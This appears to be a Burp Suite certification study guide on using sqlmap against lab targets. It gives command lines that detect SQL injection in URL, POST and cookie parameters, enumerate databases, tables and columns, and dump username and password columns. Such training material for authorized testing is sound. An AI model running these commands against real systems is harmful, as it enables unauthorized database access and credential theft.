# SQLmap Guide BSCP

## Finding SQLi in the exam:

Advanced search
![[Pasted image 20261030112545.png]]

OR

TrackingId in Cookie Header:
![[Pasted image 20261030112619.png]]
## Basics
1. Save the request to a file and check that it contains the current session and all required headers.
2. Run sqlmap
3. WIN
4. If injection is confirmed, enumerate the DB

## SQLMAP

### GET parameter

For a simple URL parameter, pass the URL with `-u` and name the parameter with `-p`:

```bash
sqlmap -u 'https://lab.example/product?category=Gifts' -p category
```

### Request captured from Burp

Use `-r` to load a raw request from a file. Specify the parameter with `-p`:

```bash
sqlmap -r request.txt -p category
```

For a POST form field named `search`:

```bash
sqlmap -r request.txt -p search
```

## Techniques

SQLmap supports several SQLi techniques. You can restrict the test to a subset with `--technique`:

```bash
sqlmap -r request.txt -p TrackingId --level=2 --technique=BEU
```

| Letter | Technique | General idea |
|---|---|---|
| `B` | Boolean-based blind | True and false conditions produce distinguishable responses. |
| `E` | Error-based | Database errors reveal information. |
| `U` | UNION query-based | A UNION result can be reflected in the response. |
| `S` | Stacked queries | A second statement can be appended where the DBMS and query context allow it. |
| `T` | Time-based blind | A condition is inferred from a measurable delay. |
| `Q` | Inline query | An injected query is embedded within the original query. |

If you omit `--technique`, sqlmap tests the techniques it supports. Restricting techniques can make a demonstration easier to follow, but it may exclude the technique that works in a particular case.

## Enumerate in steps

After detection, start by asking sqlmap for basic database context:

```bash
sqlmap -r request.txt -p TrackingId --level=3 --current-user --current-db
```

List database names:

```bash
sqlmap -r request.txt -p TrackingId --level=3 --dbs
```

Then select one database and list its tables:

```bash
sqlmap -r request.txt -p TrackingId --level=3 -D appdb --tables
```

Select a table and list its columns:

```bash
sqlmap -r request.txt -p TrackingId --level=3 -D appdb -T users --columns
```

If you have a specific hypothesis, retrieve only the relevant columns from the selected table:

```bash
sqlmap -r request.txt -p TrackingId --level=3 -D appdb -T users -C username,password --dump
```

Replace example names such as `appdb`, `users`, `username`, and `password` with names discovered in the lab. Do not begin by dumping every database and table. Use the narrowest query that answers your question.

## Useful options

| Option | What it does | When to use it |
|---|---|---|
| `-u URL` | Supplies a target URL. | Simple GET requests. |
| `-r FILE` | Loads a raw HTTP request from a file. | Burp requests with cookies, headers, or POST bodies. |
| `-p PARAM` | Tests the named parameter. | Focuses the run on one input, such as `search` or `TrackingId`. |
| `--level=N` | Expands the range of detection tests. Default is 1. | Increase gradually if the initial test misses a plausible injection point. Cookies are tested from level 2. |
| `--risk=N` | Enables additional payloads at higher risk levels. Default is 1. | Raise cautiously; some payloads can be heavier or have side effects in certain query contexts. |
| `--technique=BEUSTQ` | Selects which SQLi techniques to test. | Focus a demonstration or investigation. |
| `-v 3` | Shows payloads in the output. | Understand what sqlmap is sending. |
| `--batch` | Answers interactive prompts with defaults. | Repeatable runs after you understand the prompts. |
| `--flush-session` | Clears sqlmap's stored session data for the target. | Re-test from scratch if cached results are confusing. |
| `--proxy=http://127.0.0.1:8080` | Sends sqlmap requests through a proxy. | Inspect sqlmap traffic in Burp; make sure Burp's proxy listener is running. |

`--level` and `--risk` do different things. In real engagements raise them one at a time and only when you have a reason. Higher levels can test more payloads and input locations; higher risk can add payloads that are more intrusive or have side effects. 

In the exam go ham!

## Send sqlmap traffic through Burp

To inspect sqlmap's requests in Burp, start Burp and confirm its proxy listener is active on `127.0.0.1:8080`. Then run:

```bash
sqlmap -r request.txt -p TrackingId --level=3 --proxy='http://127.0.0.1:8080' -v 3
```

The `--proxy` option routes the outgoing requests through Burp. This is useful for reviewing payloads and responses, but it does not replace using the right request file and parameter. If Burp is configured to intercept requests, turn interception off or forward the requests so sqlmap can continue.

## Read the result carefully

When sqlmap reports an injectable parameter, record:

- The exact parameter and where it appeared: URL, POST body, or cookie.
- The SQLi technique that was confirmed.
- The DBMS identification and whether sqlmap reports it as certain or heuristic.
- What data or effect was actually verified.
- Any authentication state required for the request.

Treat sqlmap's detection as a lead to validate. A lab may require you to use discovered information through the application's login or another feature. SQL injection does not automatically imply database administrator access, stacked-query support, or operating-system command execution.

## Troubleshoot a missed detection

If sqlmap does not find injection, check the request before adding more options:

1. Send the saved request in Burp Repeater. Does it still work normally?
2. Refresh the session cookie or CSRF token if necessary, then save a new request.
3. Check spelling and capitalization in `-p`. Make sure that parameter is present in the raw request.
4. For cookie parameters, use at least `--level=2`.
5. Confirm the parameter value is in the expected part of the request: URL, body, or cookie.
6. Try a modestly higher `--level`, then consider whether another technique may be relevant.
7. If the page content changes between identical requests, blind detection may be harder. Use Burp to understand the normal response variation.
8. If timing tests are noisy or the application is rate-limiting requests, slow down and compare against a stable baseline.

## Quick reference

```bash
# Test a simple GET parameter
sqlmap -u 'https://lab.example/product?category=Gifts' -p category
sqlmap -u 'https://lab.example/product?category=*'

# Test a saved Burp request and show payloads
sqlmap -r request.txt -p search -v 3

# Test a cookie parameter (cookies require level 2)
sqlmap -r request.txt -p TrackingId --level=2

# Check the current database context
sqlmap -r request.txt -p TrackingId --level=2 --current-user --current-db

# List tables, then columns in one selected table
sqlmap -r request.txt -p TrackingId --level=2 -D appdb --tables
sqlmap -r request.txt -p TrackingId --level=2 -D appdb -T users --columns

# Inspect sqlmap's traffic in Burp
sqlmap -r request.txt -p TrackingId --level=2 --proxy='http://127.0.0.1:8080' -v 3
```

### Reference

- [sqlmap Usage Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) — request files, detection levels, risk, techniques, verbosity, and enumeration options.
